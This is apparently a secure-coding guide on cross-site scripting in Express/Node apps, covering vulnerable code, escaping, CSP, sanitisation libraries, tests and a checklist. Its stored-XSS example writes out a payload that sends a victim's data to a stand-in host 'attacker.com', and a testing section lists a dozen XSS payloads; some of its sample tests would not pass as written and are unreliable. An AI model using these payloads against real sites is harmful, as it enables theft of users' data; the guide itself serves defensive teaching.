# Security Patterns and XSS Prevention

## 🛡️ Cross-Site Scripting (XSS) Overview

Cross-Site Scripting (XSS) is one of the most common web security vulnerabilities. It occurs when an application includes untrusted data in a web page without proper validation or escaping, allowing attackers to execute scripts in victims' browsers.

### The Three Types of XSS

1. **Reflected XSS** - Script comes from HTTP request
2. **Stored XSS** - Script stored in database/server
3. **DOM-based XSS** - Script executed through DOM manipulation

## ⚠️ XSS Attack Examples

### 1. Reflected XSS
**Vulnerable Code:**
```javascript
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Search results for: ${query}</h1>`);
});
```

**Attack Vector:**
```
GET /search?q=<script>alert('XSS')</script>
```

**Result:** Script executes in user's browser when they click the malicious link.

### 2. Stored XSS
**Vulnerable Code:**
```javascript
app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  // Save to database without sanitization
  database.save({ comment, user: req.user.id });
  
  // Later, when displaying comments:
  res.send(`<div class="comment">${comment}</div>`);
});
```

**Attack Vector:**
```
POST /comment
comment=<script>fetch('/api/user-data').then(r=>r.json()).then(d=>fetch('http://attacker.com/steal?data='+JSON.stringify(d)))</script>
```

**Result:** Script executes for every user who views the comment, potentially stealing their data.

### 3. DOM-based XSS
**Vulnerable Code:**
```javascript
// Client-side JavaScript
const params = new URLSearchParams(window.location.search);
document.getElementById('content').innerHTML = params.get('content');
```

**Attack Vector:**
```
https://example.com/page?content=<img src=x onerror=alert('XSS')>
```

**Result:** Script executes through DOM manipulation without server involvement.

## 🔒 Defense Strategies

### 1. Input Validation (First Line of Defense)

**Server-side Validation:**
```javascript
const { body, validationResult } = require('express-validator');

app.post('/comment', [
  body('comment')
    .isLength({ min: 1, max: 1000 })
    .matches(/^[a-zA-Z0-9\s\.,!?'"()-]*$/)  // Whitelist approach
    .withMessage('Comment contains invalid characters')
], (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }
  // Process valid input
});
```

**Client-side Validation (UX only - never rely on this alone!):**
```javascript
function validateComment(comment) {
  const dangerous = /<script|javascript:|on\w+=/i;
  if (dangerous.test(comment)) {
    alert('Comment contains potentially dangerous content');
    return false;
  }
  return true;
}
```

### 2. Output Encoding/Escaping (Essential Protection)

**HTML Context Encoding:**
```javascript
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };
  return text.replace(/[&<>"'/]/g, m => map[m]);
}

// Safe rendering
app.get('/profile', (req, res) => {
  const userName = escapeHtml(req.user.name);
  res.send(`<h1>Welcome, ${userName}!</h1>`);
});
```

**JavaScript Context Encoding:**
```javascript
function escapeForJs(text) {
  return text.replace(/\\/g, '\\\\')
             .replace(/'/g, "\\'")
             .replace(/"/g, '\\"')
             .replace(/\n/g, '\\n')
             .replace(/\r/g, '\\r')
             .replace(/\t/g, '\\t');
}

// Safe in JavaScript context
res.send(`<script>var userName = '${escapeForJs(user.name)}';</script>`);
```

**URL Context Encoding:**
```javascript
// Safe URL encoding
const safeUrl = encodeURIComponent(userInput);
res.send(`<a href="/search?q=${safeUrl}">Search</a>`);
```

### 3. Content Security Policy (CSP)

**Basic CSP Implementation:**
```javascript
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"],  // Avoid 'unsafe-inline' in production
      styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"]
    }
  }
}));
```

**Strict CSP (Recommended):**
```javascript
app.use((req, res, next) => {
  // Generate a random nonce for each request
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  
  res.setHeader('Content-Security-Policy', 
    `default-src 'self'; ` +
    `script-src 'self' 'nonce-${res.locals.cspNonce}'; ` +
    `style-src 'self' 'unsafe-inline'; ` +
    `img-src 'self' data: https:; ` +
    `object-src 'none'; ` +
    `base-uri 'self'`
  );
  next();
});

// Use nonce in templates
res.send(`<script nonce="${res.locals.cspNonce}">
  // Safe inline script
  console.log('This script is allowed by CSP');
</script>`);
```

### 4. HTML Sanitization Libraries

**Server-side with sanitize-html:**
```javascript
const sanitizeHtml = require('sanitize-html');

const cleanComment = sanitizeHtml(userComment, {
  allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  allowedAttributes: {
    'a': ['href']
  },
  allowedIframeHostnames: ['www.youtube.com'],
  transformTags: {
    'a': (tagName, attribs) => {
      // Make all links open in new tab and add rel="noopener"
      return {
        tagName: 'a',
        attribs: {
          href: attribs.href,
          target: '_blank',
          rel: 'noopener noreferrer'
        }
      };
    }
  }
});
```

**Client-side with DOMPurify:**
```html
<script src="https://cdn.jsdelivr.net/npm/dompurify@2.4.0/dist/purify.min.js"></script>
<script>
  function displayUserContent(html) {
    const clean = DOMPurify.sanitize(html, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'a'],
      ALLOWED_ATTR: ['href'],
      ALLOW_DATA_ATTR: false
    });
    document.getElementById('content').innerHTML = clean;
  }
</script>
```

## 🏗️ Secure Architecture Patterns

### 1. Template Engines with Auto-Escaping

**Express with EJS (Auto-escaping enabled):**
```javascript
const ejs = require('ejs');

app.set('view engine', 'ejs');

// Template (auto-escapes by default)
// views/profile.ejs
/*
<h1>Welcome, <%= user.name %>!</h1>  <!-- Automatically escaped -->
<div><%- escapeHtml(user.bio) %></div>  <!-- Manually escaped -->
*/

app.get('/profile', (req, res) => {
  res.render('profile', { 
    user: {
      name: req.user.name,  // Will be auto-escaped
      bio: sanitizeHtml(req.user.bio)  // Pre-sanitized
    }
  });
});
```

**Handlebars (Auto-escaping by default):**
```javascript
const handlebars = require('express-handlebars');

app.engine('handlebars', handlebars());
app.set('view engine', 'handlebars');

// Template
/*
<h1>Welcome, {{user.name}}!</h1>  <!-- Automatically escaped -->
<div>{{{user.safeBio}}}</div>     <!-- Unescaped - use carefully -->
*/
```

### 2. API Security Patterns

**Secure JSON API Responses:**
```javascript
app.get('/api/user/:id', async (req, res) => {
  try {
    const userId = parseInt(req.params.id, 10);
    
    // Validate input
    if (!userId || userId <= 0) {
      return res.status(400).json({ error: 'Invalid user ID' });
    }
    
    const user = await getUserById(userId);
    
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    // Sanitize output (remove sensitive fields)
    const safeUser = {
      id: user.id,
      name: escapeHtml(user.name),
      email: user.email, // Email already validated on input
      bio: sanitizeHtml(user.bio),
      // Don't include: password, resetToken, etc.
    };
    
    res.json(safeUser);
    
  } catch (error) {
    console.error('API Error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});
```

**Rate Limiting to Prevent Abuse:**
```javascript
const rateLimit = require('express-rate-limit');

const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests, please try again later.',
  standardHeaders: true,
  legacyHeaders: false
});

app.use('/api/', apiLimiter);
```

### 3. Database Security Patterns

**Parameterized Queries (SQL):**
```javascript
// ❌ DANGEROUS - SQL Injection vulnerable
const query = `SELECT * FROM users WHERE name = '${userName}'`;

// ✅ SAFE - Parameterized query
const query = 'SELECT * FROM users WHERE name = ?';
db.query(query, [userName], (err, results) => {
  // Safe execution
});

// ✅ SAFE - Using ORM (Sequelize example)
const user = await User.findOne({
  where: { name: userName }  // Automatically parameterized
});
```

**NoSQL Injection Prevention (MongoDB):**
```javascript
// ❌ DANGEROUS - NoSQL Injection vulnerable
const user = await User.findOne({ name: req.body.name });

// ✅ SAFE - Input validation and sanitization
const userName = req.body.name;
if (typeof userName !== 'string' || userName.length > 100) {
  return res.status(400).json({ error: 'Invalid name' });
}

const user = await User.findOne({ 
  name: { $eq: userName }  // Explicit equality operator
});
```

## 🧪 Testing for XSS Vulnerabilities

### Common XSS Payloads for Testing

```javascript
const xssPayloads = [
  // Basic script injection
  '<script>alert("XSS")</script>',
  
  // Event handler injection
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  '<body onload=alert("XSS")>',
  
  // JavaScript protocol
  'javascript:alert("XSS")',
  
  // Data URI
  'data:text/html,<script>alert("XSS")</script>',
  
  // Encoded payloads
  '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
  
  // HTML5 vectors
  '<video><source onerror="alert(\'XSS\')">',
  '<audio src=x onerror=alert("XSS")>',
  
  // CSS injection
  '<style>@import"javascript:alert(\'XSS\')"</style>',
  
  // Attribute breaking
  '"><script>alert("XSS")</script>',
  '\';alert("XSS");//'
];
```

### Automated Testing

**Unit Tests for Sanitization:**
```javascript
const { expect } = require('chai');
const { escapeHtml, sanitizeHtml } = require('./security-utils');

describe('XSS Prevention', () => {
  describe('HTML Escaping', () => {
    it('should escape dangerous characters', () => {
      const dangerous = '<script>alert("XSS")</script>';
      const escaped = escapeHtml(dangerous);
      expect(escaped).to.not.include('<script>');
      expect(escaped).to.include('&lt;script&gt;');
    });
    
    it('should handle all XSS payloads', () => {
      xssPayloads.forEach(payload => {
        const escaped = escapeHtml(payload);
        expect(escaped).to.not.match(/<script|javascript:|onerror=/i);
      });
    });
  });
  
  describe('HTML Sanitization', () => {
    it('should remove dangerous tags', () => {
      const input = 'Hello <script>alert("XSS")</script> World';
      const sanitized = sanitizeHtml(input);
      expect(sanitized).to.equal('Hello  World');
    });
    
    it('should preserve safe formatting', () => {
      const input = 'Hello <b>bold</b> and <i>italic</i> text';
      const sanitized = sanitizeHtml(input, { 
        allowedTags: ['b', 'i'] 
      });
      expect(sanitized).to.include('<b>bold</b>');
      expect(sanitized).to.include('<i>italic</i>');
    });
  });
});
```

## 🔧 Security Tools and Libraries

### Essential Security Middleware

**Helmet.js - Security Headers:**
```javascript
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"]
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));
```

**Express Rate Limiting:**
```javascript
const rateLimit = require('express-rate-limit');

const createAccountLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 5, // limit each IP to 5 account creation requests per hour
  message: 'Too many accounts created, please try again later',
  skipSuccessfulRequests: true
});

app.post('/api/register', createAccountLimiter, registerHandler);
```

### Security Scanning Tools

1. **ESLint Security Plugin**
```bash
npm install --save-dev eslint-plugin-security
```

2. **Snyk - Vulnerability Scanning**
```bash
npm install -g snyk
snyk test
```

3. **npm audit - Dependency Vulnerabilities**
```bash
npm audit
npm audit fix
```

## 📋 Security Checklist

### Input Validation
- [ ] Validate all user inputs on the server side
- [ ] Use whitelist validation (allow known good) vs blacklist (block known bad)
- [ ] Validate data types, lengths, and formats
- [ ] Check for business logic constraints

### Output Encoding
- [ ] Escape HTML entities when displaying user content
- [ ] Use context-appropriate encoding (HTML, JavaScript, URL, CSS)
- [ ] Use template engines with auto-escaping
- [ ] Never trust client-side encoding alone

### Security Headers
- [ ] Implement Content Security Policy (CSP)
- [ ] Set X-Frame-Options to prevent clickjacking
- [ ] Use X-Content-Type-Options: nosniff
- [ ] Enable HTTP Strict Transport Security (HSTS)

### General Security
- [ ] Keep dependencies updated
- [ ] Use HTTPS everywhere
- [ ] Implement proper session management
- [ ] Log security events for monitoring
- [ ] Regular security testing and code reviews

## 🚨 Incident Response

### If XSS is Discovered

1. **Immediate Response**
   - Identify and fix the vulnerability
   - Deploy the fix immediately
   - Invalidate potentially compromised sessions

2. **Assessment**
   - Determine the scope of the vulnerability
   - Check logs for exploitation attempts
   - Assess potential data exposure

3. **Communication**
   - Notify affected users if necessary
   - Document the incident
   - Update security procedures

4. **Prevention**
   - Review similar code patterns
   - Update security testing procedures
   - Provide additional security training

Remember: **Security is an ongoing process, not a one-time implementation!**